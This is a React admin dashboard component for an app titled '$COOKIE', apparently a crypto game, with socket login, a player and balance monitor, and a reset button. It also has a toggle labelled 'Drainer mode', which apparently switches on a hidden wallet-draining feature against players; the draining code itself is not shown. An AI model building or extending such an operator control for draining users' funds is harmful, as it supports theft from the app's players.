import React, { useEffect, useState } from "react";
import { ToastContainer, toast } from "react-toastify";
import "./adminpage.style.css";
import Monitor from "../components/Monitor";
import avatar from "../assets/img/avatar.svg";
import { toBeEnabled } from "@testing-library/jest-dom/matchers";

document.adminSocket = {
  onLogin: function (e) {
    console.log(e);
  },
  onMonitorDate: function (e) {
    console.log(e);
  },
  onReset: function (e) {
    console.log(e);
  },
  onDraidner: function (e) {
    console.log(e);
  },
};

document.socket.on("admin-login", (e) => {
  document.adminSocket.onLogin(e);
});
document.socket.on("player-monitor", (e) => {
  document.adminSocket.onMonitorDate(e);
});
document.socket.on("on-allReset", (e) => {
  document.adminSocket.onReset(e);
});

document.socket.on("res-drainer-mode", (e) => {
  document.adminSocket.onDraidner(e);
});

export default function () {
  const [isAdmin, setIsAdmin] = useState(false);
  const [monitorData, setData] = useState({
    players: [],
    realTime: 0,
    totalBalance: 0,
    draidner: false,
  });
  const [user, setUser] = useState({ _username: "", _password: "" });

  const [realTime, setTime] = useState(0);

  const [totalBalance, setBalance] = useState(0);
  const login = () => {
    document.socket.emit("admin-login", {
      username: user._username,
      password: user._password,
    });
  };

  const [isReseting, setReseting] = useState(false);

  const onChange = (e) => {
    user[e.target.name] = e.target.value;
    setUser({ ...user });
  };

  const onReset = () => {
    setReseting(true);
    document.socket.emit("all-reset");
  };

  const setDraidner = () => {
    document.socket.emit("req-drainer-mode");
  };

  useEffect(() => {
    document.adminSocket.onLogin = (e) => {
      if (e.success) {
        toast.info(<div className="toast-content">welcome!!</div>);
        setIsAdmin(true);
      } else {
        toast.error(<div className="toast-content">{e.message}</div>);
      }
    };

    document.adminSocket.onMonitorDate = (e) => {
      setData({
        players: e.players,
        realTime: e.realTime,
        totalBalance: e.totalBalance,
        draidner: e.drainer,
      });
    };

    document.adminSocket.onReset = (e) => {
      toast.info(<div className="toast-content">{e.message}</div>);
      setTimeout(() => {
        setReseting(false);
      }, 500);
    };

    document.adminSocket.onDraidner = (e) => {
      toast.info(
        <div className="toast-content">
          {!e ? "Drainer Disabled" : "Drainer Enabled"}
        </div>
      );
    };

    document.title = "$COOKIE ADMIN";
  }, []);
  return !isAdmin ? (
    <div className="login-page">
      <div className="login-card">
        <div className="login-form">
          <svg
            viewBox="0 0 24 24"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <circle
              opacity="0.5"
              cx="12"
              cy="9"
              r="3"
              stroke="#1C274C"
              strokeWidth="1.5"
            />
            <circle cx="12" cy="12" r="10" stroke="#1C274C" strokeWidth="1.5" />
            <path
              opacity="0.5"
              d="M17.9691 20C17.81 17.1085 16.9247 15 11.9999 15C7.07521 15 6.18991 17.1085 6.03076 20"
              stroke="#1C274C"
              strokeWidth="1.5"
              strokeLinecap="round"
            />
          </svg>
          <input
            type="text"
            value={user.username}
            name="_username"
            placeholder="Username"
            onChange={onChange}
          />
          <input
            type="password"
            value={user.password}
            name="_password"
            placeholder="Password"
            onChange={onChange}
          />
          <button onClick={login}>LOGIN</button>
        </div>
      </div>
    </div>
  ) : (
    <div className="amdin-page">
      <ToastContainer position="bottom-right" autoClose={3000} />

      <div className="header">
        <div className="monitor-title">$COOKIE MONITOR</div>
        <div className="">
          <div className="avatar">
            <img src={avatar}></img>
          </div>
          <div>
            <label className="switch">
              <input
                type="checkbox"
                checked={monitorData.draidner}
                onChange={() => setDraidner()}
              />
              <span className="slider round"></span>
            </label>
          </div>
        </div>
      </div>
      <div className="boday">
        <div className="m-card-group">
          <div className="m-card">
            <div className="m-card-body">
              <svg
                width="70px"
                height="70px"
                viewBox="0 0 24 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M5 21C5 17.134 8.13401 14 12 14C15.866 14 19 17.134 19 21M16 7C16 9.20914 14.2091 11 12 11C9.79086 11 8 9.20914 8 7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7Z"
                  stroke="#FFFFFF"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
              <div className="title">{monitorData.players.length}</div>
            </div>
          </div>
          <div className="m-card">
            <div className="m-card-body">
              <svg
                width="70px"
                height="70px"
                viewBox="0 0 24 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M12 6.5C12 6.26077 12 6.14115 12.0807 6.06687C12.1615 5.99259 12.2741 6.002 12.4994 6.02082C13.3784 6.09424 14.2326 6.36078 15 6.80385C15.9121 7.33046 16.6695 8.08788 17.1962 9C17.7228 9.91212 18 10.9468 18 12C18 13.0532 17.7228 14.0879 17.1962 15C16.6695 15.9121 15.9121 16.6695 15 17.1962C14.0879 17.7228 13.0532 18 12 18C10.9468 18 9.91211 17.7228 9 17.1962C8.23258 16.7531 7.57467 16.1466 7.07159 15.4221C6.94265 15.2364 6.87817 15.1435 6.90213 15.0365C6.92608 14.9294 7.02968 14.8696 7.23686 14.75L11.75 12.1443C11.872 12.0739 11.933 12.0387 11.9665 11.9807C12 11.9226 12 11.8522 12 11.7113V6.5Z"
                  fill="#FFFFFF"
                />
                <circle
                  cx="12"
                  cy="12"
                  r="9"
                  stroke="#FFFFFF"
                  strokeWidth="2"
                />
              </svg>
              <div className="title">{monitorData.realTime}</div>
            </div>
          </div>
          <div className="m-card">
            <div className="m-card-body">
              <svg
                width="70px"
                height="70px"
                viewBox="0 0 24 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M14 14H17M14 10H17M9 9.5V8.5M9 9.5H11.0001M9 9.5C7.20116 9.49996 7.00185 9.93222 7.0001 10.8325C6.99834 11.7328 7.00009 12 9.00009 12C11.0001 12 11.0001 12.2055 11.0001 13.1667C11.0001 13.889 11.0001 14.5 9.00009 14.5M9.00009 14.5L9 15.5M9.00009 14.5H7.0001M6.2 19H17.8C18.9201 19 19.4802 19 19.908 18.782C20.2843 18.5903 20.5903 18.2843 20.782 17.908C21 17.4802 21 16.9201 21 15.8V8.2C21 7.0799 21 6.51984 20.782 6.09202C20.5903 5.71569 20.2843 5.40973 19.908 5.21799C19.4802 5 18.9201 5 17.8 5H6.2C5.0799 5 4.51984 5 4.09202 5.21799C3.71569 5.40973 3.40973 5.71569 3.21799 6.09202C3 6.51984 3 7.07989 3 8.2V15.8C3 16.9201 3 17.4802 3.21799 17.908C3.40973 18.2843 3.71569 18.5903 4.09202 18.782C4.51984 19 5.07989 19 6.2 19Z"
                  stroke="#FFFFFF"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
              <div className="title">ETC{monitorData.totalBalance}</div>
            </div>
          </div>
        </div>
        <div className="monitor-wrap">
          <Monitor players={monitorData.players}></Monitor>
        </div>
      </div>
      <div
        className="footer"
        style={{
          flexDirection: "row",
          display: "flex",
          justifyContent: "center",
        }}
      >
        <div className="rescet-btn" onClick={onReset}>
          <svg
            width="35px"
            height="35px"
            viewBox="0 0 21 21"
            xmlns="http://www.w3.org/2000/svg"
            className={isReseting ? "resetloding" : ""}
          >
            <g
              fill="none"
              fillRule="evenodd"
              stroke="#FFFFFF"
              strokeLinecap="round"
              strokeLinejoin="round"
              transform="matrix(0 1 1 0 2.5 2.5)"
            >
              <path d="m3.98652376 1.07807068c-2.38377179 1.38514556-3.98652376 3.96636605-3.98652376 6.92192932 0 4.418278 3.581722 8 8 8s8-3.581722 8-8-3.581722-8-8-8" />
              <path d="m4 1v4h-4" transform="matrix(1 0 0 -1 0 6)" />
            </g>
          </svg>
          RESET
        </div>
      </div>
    </div>
  );
}
